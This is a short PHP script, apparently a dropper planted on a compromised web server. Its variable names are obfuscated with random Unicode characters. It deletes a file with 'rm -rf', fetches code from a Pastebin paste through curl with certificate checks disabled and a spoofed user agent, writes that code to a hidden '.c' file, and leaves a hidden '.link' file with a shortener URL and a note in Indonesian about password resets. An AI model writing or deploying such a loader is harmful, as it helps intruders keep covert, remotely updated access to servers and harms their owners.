<?php
system('rm -rf hiden.php');
$url = 'https://pastebin.com/FwgDMzTp';
function abc($url)
{	$𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛=curl_init();curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLOPT_URL, $url);curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36");curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLOPT_RETURNTRANSFER,1);curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLOPT_FOLLOWLOCATION,1);curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLOPT_HEADER, $show_header);curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLINFO_HEADER_OUT,true);curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLOPT_COOKIEFILE,"cookie.txt");curl_setopt($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛,CURLOPT_COOKIEJAR,"cookie.txt");	$result=curl_exec($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛);	$info=curl_getinfo($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𐦛);return $result;}
$𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𞡞=explode('<textarea id="paste_code" class="paste_code" name="paste_code" onkeydown="return catchTab(this,event)">',abc($url));
$𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚䒺=explode('</textarea>', $𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𞡞[1]);
$𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𞺕=".c";
file_put_contents($𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚𞺕,$𐌒鐶𧨆𧆄ﲳꇤ𐦰𐰧𐙫𨴰𐴊𦹌솘𞢀𞢉𐬕𒔻𐭊䵯쒼𞠹ꕂⅇ𦁰𛇡ی葐𑖦𗬚䒺[0]);
$link = '.link';
file_put_contents($link,'https://semawur.com/JVXsYqGv Password reset 3-4 hari sekali ya bro');
?>
